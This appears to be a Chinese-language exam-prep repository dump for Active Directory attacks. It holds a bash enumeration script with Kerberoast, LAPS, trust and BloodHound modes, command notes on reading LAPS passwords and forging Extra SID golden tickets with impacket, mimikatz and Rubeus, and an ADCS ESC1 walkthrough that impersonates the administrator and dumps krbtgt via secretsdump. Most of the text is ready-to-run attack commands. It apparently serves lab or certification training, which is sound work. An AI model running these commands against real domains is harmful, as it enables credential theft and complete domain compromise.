have() { command -v "$1" >/dev/null 2>&1; }

while getopts "m:s:D:N:u:p:H:b:o:nh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        D) DOMAIN="$OPTARG" ;;
        N) NETBIOS="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        b) BASEDN="$OPTARG" ;;
        o) OUTDIR="$OPTARG" ;;
        n) DRY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ---------- 参数校验 ----------
if [ -z "$DC" ] || [ -z "$DOMAIN" ]; then
    err "缺少必填参数：-s <DC主机> 与 -D <域FQDN> 必须提供（例：-s DC01.corp.local -D corp.local）"
    usage
fi
if [ -n "$USER" ] && [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
    err "给了 -u $USER 就必须给 -p PASS 或 -H NTHASH"
    usage
fi
case "$MODE" in
    all|base|users|computers|groups|spn|delegation|laps|trust|sid|nmap|netexec|bloodhound) ;;
    *) err "未知的 -m 模式：${MODE}（用 -h 看清单）"; exit 1 ;;
esac

# BaseDN 推导：corp.local -> DC=corp,DC=local
if [ -z "$BASEDN" ]; then
    _IFS="$IFS"; IFS='.'; read -r -a _segs <<< "$DOMAIN"; IFS="$_IFS"
    _acc=""
    for seg in "${_segs[@]}"; do
        [ -z "$seg" ] && continue
        if [ -z "$_acc" ]; then _acc="DC=$seg"; else _acc="$_acc,DC=$seg"; fi
    done
    BASEDN="$_acc"
fi
# NetBIOS 推导：corp.local -> CORP
if [ -z "$NETBIOS" ]; then
    NETBIOS="$(printf '%s' "${DOMAIN%%.*}" | tr '[:lower:]' '[:upper:]')"
fi
BIND_DN="$NETBIOS\\$USER"
LDAP_URI="ldap://$DC"

mkdir -p "$OUTDIR" 2>/dev/null || err "无法创建产物目录 ${OUTDIR}（不影响只打印模式）"

info "目标 DC : $DC"
info "域      : $DOMAIN (BaseDN=$BASEDN, NetBIOS=$NETBIOS)"
if [ -n "$USER" ]; then info "绑定身份: $BIND_DN"; else info "绑定身份: 匿名（-x，多数域会拒绝，仅供探测）"; fi
[ "$DRY" = "1" ] && info "DRY RUN：只打印命令"

# ---------- 通用执行器 ----------
# 打印命令行：只对含空格/引号的参数加单引号，保证输出能直接复制执行
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

# run_cmd <描述> <命令...>：先打印，非 dry 再执行；命令不存在时给出可读错误
run_cmd() {
    local desc="$1"; shift
    head_ "$desc"
    printable "$@"
    if [ "$DRY" = "1" ]; then return 0; fi
    if ! have "$1"; then
        err "本机缺少命令：$1（Kali：sudo apt install -y ldap-utils nmap impacket-scripts，或 pipx install 对应工具）"
        return 0
    fi
    "$@" 2>&1 || err "命令返回非零（LDAP 拒绝匿名/凭据错误/网络不通都会如此），请核对上面输出"
    return 0
}

# ldap_search <filter> <属性列表(空格分隔)>
ldap_search() {
    local filter="$1" attrs="$2"
    if [ -n "$USER" ]; then
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -D "$BIND_DN" -w "$PASS" -b "$BASEDN" "$filter" $attrs
    else
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -b "$BASEDN" "$filter" $attrs
    fi
}

# ---------- 各模式实现 ----------
mode_base() {
    ldap_search "(objectClass=*)" "namingContexts"
    run_cmd "nmap ldap 脚本（匿名即可跑，看域信息与是否允许匿名绑定）" \
        nmap -n -sV --script "ldap* and not brute" -p 389 "$DC"
}

mode_users() {
    ldap_search "(&(objectClass=user)(objectCategory=person))" \
        "sAMAccountName userPrincipalName description pwdLastSet lastLogon memberOf adminCount"
    echo
    info "只想看用户名：ldapsearch ... '(&(objectClass=user)(objectCategory=person))' sAMAccountName | grep sAMAccountName:"
    info "抓 AS-REP Roasting 候选（不需要预认证，UAC 4194304）："
    printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "%s" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName\n' \
        "$LDAP_URI" "$BIND_DN" "$BASEDN"
}

mode_computers() {
    ldap_search "(objectClass=computer)" \
        "sAMAccountName dnsHostName operatingSystem operatingSystemVersion lastLogon pwdLastSet"
}

mode_groups() {
    ldap_search "(objectClass=group)" "sAMAccountName member memberOf adminCount"
    echo
    info "特权组（按 well-known RID）成员，用 SID 直接查更稳："
    for rid in 512 519 518 544; do
        printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "CN=Users,%s" "(objectSid=<域SID-%s>)" sAMAccountName member\n' \
            "$LDAP_URI" "$BIND_DN" "$BASEDN" "$rid"
    done
    info "（CN=Users 里找不到的组改用 -b \"$BASEDN\" 全目录查 (objectSID=...)）"
}

mode_spn() {
    ldap_search "(&(servicePrincipalName=*)(!(objectClass=computer)))" \
        "sAMAccountName servicePrincipalName memberOf adminCount pwdLastSet"
    echo
    info "Kerberoast（需要明文或 NTHASH，产出 hashcat -m 13100 可破的票据）："
    printf '  impacket-GetUserSPNs -dc-ip %s -outputfile %s/spn.txt %s/%s:PASS\n' \
        "$DC" "$OUTDIR" "$NETBIOS" "$USER"
    printf '  hashcat -m 13100 %s/spn.txt /usr/share/wordlists/rockyou.txt\n' "$OUTDIR"
}

mode_delegation() {
    ldap_search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
        "sAMAccountName dnsHostName"            # 非约束委派 TRUSTED_FOR_DELEGATION
    ldap_search "(msDS-AllowedToDelegateTo=*)" \
        "sAMAccountName msDS-AllowedToDelegateTo"   # 约束委派
    ldap_search "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
        "sAMAccountName dnsHostName"                 # 基于资源的约束委派（已被写入过）
    echo
    info "判定说明：非约束=UAC 含 524288；约束=账户上 msDS-AllowedToDelegateTo 有值；"
    info "RBCD 的目标写在『目标计算机』的 msDS-AllowedToActOnBehalfOfOtherIdentity 上。"
}

mode_laps() {
    info "两版 LAPS 一次查全（属性不存在时输出为空，据此判断部署版本）："
    ldap_search "(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))" \
        "sAMAccountName dnsHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-PasswordExpirationTime msLAPS-EncryptedPassword"
    echo
    info "legacy LAPS 明文查询（AdmPwd）：-b \"$BASEDN\" \"(ms-Mcs-AdmPwd=*)\" dnshostname ms-Mcs-AdmPwd"
    info "Windows LAPS 明文模式：把上面属性换成 msLAPS-Password / msLAPS-PasswordExpirationTime"
    info "Windows LAPS 若只有 msLAPS-EncryptedPassword（DPAPI 加密），纯 LDAP 解不出明文，"
    info "需目标机 Get-LapsADPassword 或 DC 侧 LAPS 模块——详见 m12-laps-and-trust-notes.md"
}

# 信任属性解码表（场景 53 判定用）
print_trust_legend() {
    cat <<'EOF'

--- 判定表（把上面的数值对号入座）---------------------------------------
trustDirection: 0=禁用  1=入站(对方可认证到本域)  2=出站(本域可认证到对方)  3=双向
trustType     : 1=Downlevel(非AD)  2=Uplevel(AD)  3=MIT(Kerberos v5)  4=DCE
trustAttributes 关键位：
  0x00000020 (32)  WITHIN_FOREST  -> 林内(父子)信任，SID 过滤默认不生效，Extra SID 可行
  0x00000008 (8)   FOREST_TRANSITIVE -> 林间信任
  0x00000040 (64)  FOREST_TRANSITIVE 之外的跨林位
  0x00000400 (1024) TREAT_AS_EXTERNAL / 0x00000004 QUARANTINED -> SID 过滤按外部处理
判定结论：
  WITHIN_FOREST(0x20) + 出站或双向(2/3) -> 场景 53 的 Extra SID 黄金票路线成立
  外部/林间信任 或 QUARANTINED        -> SID filtering 默认开启，Extra SID 无效，换路径
------------------------------------------------------------------------
EOF
}

mode_trust() {
    ldap_search "(objectClass=trustedDomain)" \
        "cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier"
    print_trust_legend
    echo
    info "Windows 侧等价（子域主机上执行）：nltest /domain_trusts /all_trusts"
    info "netexec 侧：netexec ldap $DC -u $USER -p 'PASS' -M enum_trusts"
    info "拿到子域 krbtgt 后做 Extra SID 黄金票的命令见 m12-laps-and-trust-notes.md"
}

# objectSid(base64) -> S-1-5-21-... （python3 可用时解码，否则给 base64 与替代命令）
decode_sid_b64() {
    local b64="$1"
    if [ -n "$PYBIN" ]; then
        "$PYBIN" - "$b64" <<'PYEOF'
import base64, sys, struct
raw = base64.b64decode(sys.argv[1].strip())
rev, sub = raw[0], raw[1]
# 标识部分大端 6 字节，子机构部分每个 4 字节小端
ident = struct.unpack('>Q', b'\x00\x00' + raw[2:8])[0]
out = ["S-%d-%d" % (rev, ident)]
for i in range(sub):
    off = 8 + i * 4
    out.append(str(struct.unpack('<I', raw[off:off + 4])[0]))
print('-'.join(out))
PYEOF
    else
        echo "(python3 不可用，objectSid(base64)=${b64}；改用 impacket-lookupsid 取 SID)"
    fi
}

mode_sid() {
    if [ -n "$USER" ] && have impacket-lookupsid; then
        run_cmd "域 SID（lookupsid，最稳）" impacket-lookupsid "$NETBIOS/$USER:$PASS@$DC" 2
    else
        info "impacket-lookupsid 不可用或无凭据，退回 LDAP 读 objectSid 再解码："
        local b64
        if [ -n "$USER" ]; then
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -D "$BIND_DN" -w "$PASS" \
                   -b "$BASEDN" "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        else
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -b "$BASEDN" \
                   "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        fi
        printf 'ldapsearch ... "(objectClass=domainDNS)" objectSid\n'
        if [ -n "$b64" ]; then
            printf '域 SID : %s\n' "$(decode_sid_b64 "$b64")"
            info "场景 53 用它的 Enterprise Admins SID（域 SID + -519）做 -extra-sid"
        else
            err "没取到 objectSid：匿名被拒（加 -u/-p）或 DC 不可达"
        fi
    fi
}

mode_nmap() {
    run_cmd "nmap LDAP 脚本全套" nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 "$DC"
}

mode_netexec() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER -H $NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        err "netexec 模式需要 -u/-p 或 -u/-H（NTHASH 只有 netexec/bloodhound 模式吃）"
        return 0
    fi
    run_cmd "netexec ldap（域信息 + 常用模块）" netexec ldap "$DC" $creds \
        -M enum_trusts -M laps
    run_cmd "netexec smb（共享/签名/会话）" netexec smb "$DC" $creds --shares
    run_cmd "netexec winrm（是否可远程执行）" netexec winrm "$DC" $creds
    info "模块名随版本变化：netexec ldap -L 列可用模块，再挑 enum_trusts / laps / adcs"
}

mode_bloodhound() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER --hashes 00000000000000000000000000000000:$NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        err "bloodhound 模式需要 -u/-p 或 -u/-H"
        return 0
    fi
    run_cmd "bloodhound-python 全量采集（产出 zip 在 ${OUTDIR}）" \
        bloodhound-python -c ALL $creds -d "$DOMAIN" -dc "$DC" -ns "$DC" --dns-tcp
    info "采集完把 $OUTDIR/*.zip 拷回本机导入 BloodHound：sudo neo4j start && bloodhound"
    info "跨网段（走 socks）时在命令前加 proxychains，并保留 --dns-tcp"
}

case "$MODE" in
    all)
        mode_base; mode_users; mode_computers; mode_groups
        mode_spn; mode_delegation; mode_laps; mode_trust; mode_sid
        ;;
    base)       mode_base ;;
    users)      mode_users ;;
    computers)  mode_computers ;;
    groups)     mode_groups ;;
    spn)        mode_spn ;;
    delegation) mode_delegation ;;
    laps)       mode_laps ;;
    trust)      mode_trust ;;
    sid)        mode_sid ;;
    nmap)       mode_nmap ;;
    netexec)    mode_netexec ;;
    bloodhound) mode_bloodhound ;;
esac

printf '\n[*] 完成模式：%s（产物目录 %s）\n' "$MODE" "$OUTDIR"
info "下一步：LAPS 命中看场景 49；委派/RBCD 命中看场景 51/52（m12-delegation-attacks.ps1）；"
info "        信任 + SID 命中看场景 53（m12-laps-and-trust-notes.md 的 Extra SID 段）。"
````

#### 源码 `scripts/infra/m12-laps-and-trust-notes.md` {#scripts-infra-m12-laps-and-trust-notes-md}

````markdown
# m12 · LAPS 读取、域/林信任枚举、Extra SID 与 SID filtering 命令笔记

<!--
用途：LAPS（legacy AdmPwd 与 Windows LAPS 两种读取方式）、域/林信任枚举与判定、
      Extra SID / SID history 注入、SID filtering 注意事项的命令速查（纯笔记，非可执行脚本）。
场景：M12 场景 49（读 LAPS）、53（子域 → 林根：信任判定 + Extra SID）。
依赖：Linux 侧 ldapsearch（ldap-utils）/ netexec / impacket（ticketer、secretsdump）/
      bloodhound-python；Windows 侧 ADSI（系统自带）、nltest（系统自带）、
      PowerView 或 AdmPwd.PS / LAPS PowerShell 模块（需投递或自带）。
使用：按小节顺序执行；命令里的占位符替换后再粘贴。Linux 侧批量枚举用
      scripts/linux/m12-ad-enum-linux.sh -m laps / -m trust，Windows 侧用
      scripts/powershell/m12-ad-enum-windows.ps1 -Mode LAPS。
占位符：DOMAIN=域 FQDN  TARGET=DC/主机  USER/PASS/NTHASH=凭据  LHOST=攻击机 IP
      ——本文命令里的 corp.local / child.corp.local 都是示意域名，替换成考试环境真实值。
测试状态：命令形状按 cheat sheet "AD Enumeration / AD Attacking" 与目标环境常见配置整理，
      未在真实多域/多林环境逐条实测；SID 与信任属性以目标实际返回值为准。
-->

> 一句话原则：**先判定再动手**。LAPS 要先分清版本（legacy `ms-Mcs-AdmPwd*` vs Windows LAPS
> `msLAPS-*`）；跨域要先判定信任属性（是否 `WITHIN_FOREST`、方向是否可用），
> 判定不成立时换路径，不要在不可能的路线耗时间。
>
> 占位符：`DOMAIN` `TARGET` `USER` `PASS` `NTHASH` `LHOST`

---

## 1. LAPS 版本判定（30 秒）

```bash
# Linux：一次查四属性，看哪个存在
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword

# 只看"装没装"（过期时间属性默认域用户可读，是最好的存在性判据）
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" dnshostname
```

| 看到的结果 | 含义 |
|---|---|
| 有 `ms-Mcs-AdmPwd` 值 | legacy LAPS，明文可读 → 直接拿去远程执行 |
| 只有 `ms-Mcs-AdmPwdExpirationTime` 没密码 | legacy LAPS 已部署，但当前身份**无读权限** |
| 有 `msLAPS-Password` | Windows LAPS 明文模式，可直接读 |
| 只有 `msLAPS-EncryptedPassword` | Windows LAPS 加密模式（DPAPI），纯 LDAP 拿不到明文 |
| 什么都查不到 | 没部署 LAPS，或 NetBIOS/BaseDN 写错 |

---

## 2. legacy LAPS（`ms-Mcs-AdmPwd`）读取

### Linux 侧

```bash
# 单台
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(&(objectClass=computer)(sAMAccountName=WS02$))" \
  dnshostname ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
# 全域扫一遍（有读权限时最快）
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" dnshostname ms-Mcs-AdmPwd

# netexec（有对应模块时）
netexec ldap TARGET -u USER -p 'PASS' -M laps
netexec ldap TARGET -u USER -H NTHASH -M laps
```

### Windows 侧（无 RSAT / 无 PowerView，纯 ADSI）

```powershell
# 全域：有密码值的机器
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").FindAll() |
  ForEach-Object { $_.Properties.dnshostname; $_.Properties.'ms-mcs-admpwd' }

# 单台
([adsisearcher]"(&(objectCategory=computer)(sAMAccountName=WS02$))").FindOne().Properties.'ms-mcs-admpwd'

# 只判存在性（任何域用户可读）
([adsisearcher]"(&(objectCategory=computer)(ms-Mcs-AdmPwdExpirationTime=*))").FindAll().Count
```

### Windows 侧（有 PowerView / AdmPwd.PS 时）

```powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Identity WS02 -Properties ms-Mcs-AdmPwd
Get-DomainComputer | Select-Object dnshostname,'ms-mcs-admpwd' | Where-Object { $_.'ms-mcs-admpwd' }

# legacy LAPS 官方模块
Import-Module AdmPwd.PS
Get-AdmPwdPassword -ComputerName WS02
```

### 本地是否装了 legacy LAPS 客户端（判断版本用）

```powershell
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
```

---

## 3. Windows LAPS（`msLAPS-*`）读取

```bash
# Linux：明文模式
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(msLAPS-Password=*)" dnshostname msLAPS-Password msLAPS-PasswordExpirationTime
```

```powershell
# Windows LAPS 明文模式（PowerShell 模块）
Get-LapsADPassword -Identity WS02 -AsPlainText

# 加密模式（msLAPS-EncryptedPassword，DPAPI 保护）：
#   纯 LDAP / 非授权会话解不出明文，需要能在目标机上解密的上下文
Get-LapsADPassword -Identity WS02 -AsPlainText          # 在有权限的会话里仍是首选
#   注册表里确认策略（Windows 11 / Server 2022+）
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Services\AdmPwd
```

**加密模式拿不到明文时不要死磕**，三条备选：
1. 换仍用 legacy LAPS 的机器（同一域常混用）；
2. 换开了 `msLAPS-Password` 明文策略的机器；
3. 先提权到能读该属性的身份，再回来读。

---

## 4. 谁有权限读 LAPS（可读性排查）

```powershell
# PowerView：找对 ms-Mcs-AdmPwd 有 ReadProperty 的主体
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } |
  ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier) -PassThru } |
  Select-Object IdentityName, ObjectDN
```

```bash
# Linux 侧对照：先确认"我"是谁、在哪些组
netexec ldap TARGET -u USER -p 'PASS' -M laps             # 有权限时直接出密码
bloodhound-python -c ACL -u USER -p 'PASS' -d DOMAIN -dc TARGET -ns TARGET --dns-tcp
# 看目标对象 ACL 用 scripts/powershell/m12-ad-enum-windows.ps1 -Mode ACL
```

- 属性存在但读不到 → ACL 问题，不是工具问题；
- 全域都没有值 → 没部署或未到重置周期。

---

## 5. 拿到 LAPS 密码后的落地

```bash
# 445 开：SMB/WMI 系列（LAPS 管的是目标机本地 Administrator）
impacket-wmiexec DOMAIN/Administrator@TARGET -p 'PASS'
impacket-psexec  DOMAIN/Administrator@TARGET -p 'PASS'
# 只开 5985：WinRM
evil-winrm -i TARGET -u Administrator -p 'PASS'
# 有哈希时
impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NTHASH
```

- **LAPS 密码按机器区分**：WS02 的密码进不了 WS03；用之前确认是同一台。
- 两协议都不开 → 该密码当前无用，回枚举找别的入口。

---

## 6. 域 / 林信任枚举

### Windows

```cmd
nltest /domain_trusts /all_trusts
nltest /trusted_domains
nltest /dclist:DOMAIN
```

```powershell
# 有 RSAT 时
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, ForestTransitive
(Get-ADForest).Domains
# 无 RSAT（ADSI）
([adsisearcher]"(objectClass=trustedDomain)").FindAll() |
  ForEach-Object { $_.Properties.cn; $_.Properties.trustpartner;
                  $_.Properties.trustattributes; $_.Properties.trustdirection }
```

### Linux

```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=trustedDomain)" \
  cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier

netexec ldap TARGET -u USER -p 'PASS' -M enum_trusts
./scripts/linux/m12-ad-enum-linux.sh -m trust -s TARGET -D corp.local -u USER -p 'PASS'
```

---

## 7. 信任判定表（场景 53 的核心）

**trustDirection**：`0`=禁用 · `1`=入站（对方可认证到本域）· `2`=出站（本域可认证到对方）· `3`=双向

**trustType**：`1`=Downlevel(非 AD) · `2`=Uplevel(AD) · `3`=MIT(Kerberos v5) · `4`=DCE

**trustAttributes 关键位**

| 值 | 常量 | 含义 / 对 Extra SID 的影响 |
|---|---|---|
| `0x00000020` (32) | `WITHIN_FOREST` | **林内（父子）信任**，SID 过滤默认不生效 → Extra SID 可行 |
| `0x00000008` (8) | `FOREST_TRANSITIVE` | 林信任，跨林 |
| `0x00000004` (4) | `QUARANTINED` | 隔离，SID 过滤按外部处理 → Extra SID 无效 |
| `0x00000400` (1024) | `TREAT_AS_EXTERNAL` | 按外部信任处理 → SID 过滤开启 |
| `0x00000040` (64) | `CROSS_ORGANIZATION` | 跨组织，按外部处理 |

**判定结论**

- `WITHIN_FOREST(0x20)` + 出站或双向（`2` / `3`）→ Extra SID 黄金票路线成立；
- 外部/林间信任、或带 `QUARANTINED` / `TREAT_AS_EXTERNAL` → SID filtering 默认开启，**Extra SID 无效**，换路径（跨域 ACL、LAPS、委派、ADCS 重新评估）；
- 方向是"根→子"的单向入站 → 子域无法认证到根，互信票与 Extra SID 都走不通。

---

## 8. Extra SID 黄金票（子域 → 林根）

前置：① 上面判定为林内信任且方向可用；② 拿到**子域 krbtgt 的 NTLM**；③ 子域 SID 与**根域 SID**（根域 SID + `-519` = Enterprise Admins）。

```bash
# ① 子域 DC 上拿 krbtgt（已有子域 DA 时）
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:'PASS'@TARGET

# ② 取根域 SID（根域上下文里）
impacket-lookupsid DOMAIN/USER:'PASS'@TARGET 2        # 输出里的域 SID
# 或用 ldapsearch "(objectClass=domainDNS)" objectSid（见 m12-ad-enum-linux.sh -m sid）

# ③ 造带 Extra SID 的黄金票
impacket-ticketer -nthash <子域krbtgt的NT> -domain child.corp.local \
  -domain-sid <子域SID> -extra-sid '<根域SID>-519' Administrator

# ④ 用票打根域
export KRB5CCNAME=Administrator.ccache
klist -e
impacket-secretsdump -k -no-pass <根DC FQDN>
```

**Windows 侧等价**

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<子域SID> /krbtgt:<子域krbtgt NT> /sids:<根域SID>-519 /ptt
```
```powershell
.\Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<子域SID> /krbtgt:<子域krbtgt NT> /sids:<根域SID>-519 /ptt
```

- `-extra-sid` 只能是**根域 SID 的 RID 后缀**常见值：`-519`(Enterprise Admins)、`-512`(Domain Admins)、`-518`(Schema Admins)。
- 高频错误：根域 SID 抄错 / 忘了 `-519` 后缀 / `/etc/hosts` 里根 DC 的 FQDN 解析不到。

---

## 9. SID history 注入与 SID filtering 注意事项

**注入**（把外域 SID 塞进 PAC 的 ExtraSids / SIDHistory）：

```bash
impacket-ticketer -nthash NTHASH -domain DOMAIN -domain-sid <域SID> -extra-sid '<目标域SID>-519' USER
```
```cmd
mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<域SID> /krbtgt:NTHASH /sids:<目标SID>-519 /ptt
```
```cmd
mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<域SID> /krbtgt:NTHASH /sids:<目标SID> /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

**SID filtering（隔离）要点**

- 目的：跨信任时，KDC 会**剥离**不属于本林的 SID（ExtraSids / SIDHistory），所以注入的 Enterprise Admins SID 在过滤开启时会被丢掉。
- 默认行为：林内父子/树根信任**不过滤**；外部信任与林信任**默认过滤**；`QUARANTINED` / `TREAT_AS_EXTERNAL` 位会强制按外部处理。
- 域管理员可用 `netdom trust DOMAIN /domain:OTHER /quarantine:no` 关闭过滤（需要 EA 权限，考试中基本不指望，也不要为此去改目标环境）。
- 判定方法回到第 7 节：看 `trustAttributes`，不要靠"试一下看看行不行"。
- 即使过滤已关，还要看目标是否启用 `EnableSIDHistory` 相关策略与 PAC 校验；拿不到预期权限时先 `klist` / `whoami /groups` 确认 SID 是否真的进了令牌。

**验证 Extra SID 是否生效**

```bash
klist -e                                     # 票是否生成、主体对不对
impacket-secretsdump -k -no-pass <根DC FQDN> # 能 dump 出根域 krbtgt = 生效
```
```cmd
whoami /groups                               # 注入 /ptt 后应能看到 Enterprise Admins 的 SID
```

---

## 10. 失败分支速查

| 现象 | 判断 | 处理 |
|---|---|---|
| LAPS 属性全空 | 未部署 / 无读权限 | 换机器枚举；或先提权再读；或转 RBCD/委派/ADCS |
| 只有加密的 `msLAPS-EncryptedPassword` | Windows LAPS 加密模式 | 找 legacy 机器或明文策略机器；不要死磕解密 |
| 密码对但进不去 | 密码属于另一台机器 | 确认机器名，换对应机器的密码 |
| 只开 5985 | SMB 不通 | `evil-winrm`；两协议都关则放弃这条 |
| 信任是外部/林间 | SID filtering 开 | Extra SID 无效，改走跨域 ACL 或其他入口 |
| 单向且方向相反 | 子域无法认证到根 | 只能靠根域内其他路径 |
| 黄金票认证失败（TGS 被拒） | SID/后缀/FQDN 写错 | 核对 `-extra-sid` 与 `/etc/hosts` 的根 DC 解析 |
| 没有子域 krbtgt | 只控了非 DC 高权限 | 先在子域内横向到 DC 再 `secretsdump` |

---

## 11. 考试注意 / OPSEC

- LAPS 查询会写 LDAP 审计日志，属预期枚举行为；**不要**对全域 dump 后逐个乱试密码，只取场景需要的机器。
- 密码不要以明文长命令留在 shell 历史里（用环境变量或脚本参数）。
- 黄金票 / Extra SID 属域内最高敏感操作：只在信任判定成立后做，完成后清理 `ccache`；`ticketer` 只在攻击机本地跑，不向目标投递文件。
- `/etc/hosts` 必须同时能解析子域 DC 与根 DC 的 FQDN（Kerberos 不接受 IP），用
  `scripts/linux/m12-kerberos-tickets-linux.sh -m hosts` 生成模板。
- 时间偏差 >5 分钟会让一切 Kerberos 操作失败，先校时再排查。
````

## 场景 54：低权限域用户可以申请错误配置的证书模板（ESC1）

**场景回顾**：域内部署 ADCS；某已发布模板满足 ESC1 条件，且当前低权限用户**拥有申请权**。目标：用证书拿到管理员身份。

**ESC1 判定条件（四条同时满足才算）**：① 模板开启**申请者提供 SAN**（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`，即能填 `-upn`）；② 模板 EKU 含**客户端认证**（`Client Authentication`，或用 Any Purpose 的"任意用途"模板，考试常遇到）；③ 模板允许低权限用户/组**注册**（enroll 权限）；④ 模板**未设置** CA 证书管理器审批（`CA Manager Approval` 关闭，否则申请被挂起）。

**前提与假设**：`certipy`（Kali：`certipy-ad`）可用；攻击机能解析并访问 CA 主机（LDAP/DCERPC，必要时 `/etc/hosts`）；已知 DC 与 CA 的 FQDN。

**准备（攻击机侧）**：`certipy find` 先做全量模板枚举并标出可利用项（一次枚举同时拿到 CA 名/模板清单/可申请者，避免盲试）。

**执行步骤**：
```bash
# ① 枚举：列出 -vulnerable 模板与可注册主体
certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
# ② 申请：冒充 administrator（SAN 填其 UPN）
certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
  -template 'VulnTemplate' -upn administrator@corp.local -dc-ip DC01.corp.local -out admin
# ③ 用证书换 NTLM 哈希 → DCSync
certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```
**用到的脚本**：`scripts/linux/m12-adcs-esc1-esc8.sh`（enumerate/req/auth 一键封装 + 参数模板）。

**验证**：`certipy auth` 成功输出 NTLM 哈希；`secretsdump` 能读 `krbtgt` 即达域管。

**失败分支与备选**：
- `req` 报 0x80094012 / 证书策略不匹配 → 模板 EKU 不含客户端认证或模板被拒，换 `-template` 候选（用 `certipy find` 的完整列表而非只看 vulnerable 标记）。
- `req` 报权限/被拒 → 当前用户对该模板无注册权；`-upn` 用户不存在或 UPN 不匹配；逐个核对 ESC1 四条件。
- 申请成功但 `auth` 失败 → 证书主题/签发时间问题，重新 `req` 用 `-out` 覆盖；或换 `certipy auth -username administrator -domain corp.local` 显式指定。
- CA 名/主机解析失败 → `find` 输出里取 `CA Name` 与 DNS 主机名，`/etc/hosts` 指到真实 CA IP；`-target` 参数可直指 CA。
- 无可用 ESC1 模板 → 别硬试，跳到 ESC8（场景 55）或其他入口。

**考试注意 OPSEC**：`certipy find -vulnerable` 输出会列全域问题模板，只看场景需要的；申请证书会写入 CA 日志，冒充对象选场景目标（管理员/机器账户），不要为"测试"乱申请无关证书。

---

#### 源码 `scripts/linux/m12-adcs-esc1-esc8.sh` {#scripts-linux-m12-adcs-esc1-esc8-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# 用途：ADCS 两条主线的封装——ESC1（模板可申请者提供 SAN，低权限直接冒充管理员）
#       与 ESC8（NTLM 中继到 ADCS HTTP 注册端点换证书），外加模板枚举、PFX→ccache
#       流转与依赖自检。每个模式都先打印完整命令，再加 -x 才会真正执行。
# 场景：M12 场景 54（低权限域用户申请错误配置的证书模板）与场景 55（CA 存在可中继
#       的 HTTP 注册入口）。
